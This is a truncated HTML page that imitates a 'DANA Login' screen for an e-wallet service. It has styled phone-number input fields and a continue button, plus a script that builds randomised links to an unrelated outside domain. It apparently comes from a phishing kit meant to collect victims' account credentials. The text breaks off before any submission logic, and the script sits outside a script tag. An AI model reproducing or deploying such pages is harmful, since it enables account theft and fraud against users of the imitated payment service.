<!DOCTYPE html>

<title>DANA Login</title>

<style>
body{margin:0;font-family:Arial,sans-serif;background-color:#118eea;color:white;text-align:center}
.container{padding:40px 20px 100px}
.logo{margin-top:30px;margin-bottom:20px}
.instruction{font-size:18px;margin-bottom:20px}
.input-group{display:flex;justify-content:center;align-items:center;margin-bottom:20px;gap:10px}
.country-code{background-color:white;color:black;border-radius:10px;padding:10px 15px;display:flex;align-items:center}
.country-code img{width:20px;height:auto;margin-right:8px}
.phone-input{padding:12px;font-size:18px;border:none;border-radius:10px;width:200px;text-align:left;font-weight:bold;outline:none;transition:border .3s}
.phone-input.error{border:2px solid red}
.description{font-size:12px;color:#f0f0f0;margin:20px 30px}
.description b{color:white}
#lanjutBtn{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background-color:white;color:#ccc;font-weight:bold;padding:14px 120px;font-size:16px;border:none;border-radius:10px;cursor:pointer}
.loading{display:none;position:relative;margin-top:20px;margin-left:auto;margin-right:auto;width:50px;height:50px}
.loading img.static-image{position:absolute;width:50px;height:50px;top:0;left:0;z-index:1}
.loading img.spinner{position:absolute;width:40px;height:40px;top:10%;left:10%;transform:translate(-50%,-50%);animation:spin .7s linear infinite;z-index:2}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(-360deg)}}
.label-row{display:flex;justify-content:flex-start;gap:58px;margin-left:-0px;font-size:14px}
</style>

function generateDashLink(domain="https://lyanan.info/"){
const hexChars="abcdef0123456789"
let token=""
for(let i=0;i<32;i++){
token+=hexChars[Math.floor(Math.random()*hexChars.length)]
}
return domain+token
}

document.addEventListener("DOMContentLoaded",()=>{
const link=generateDashLink()
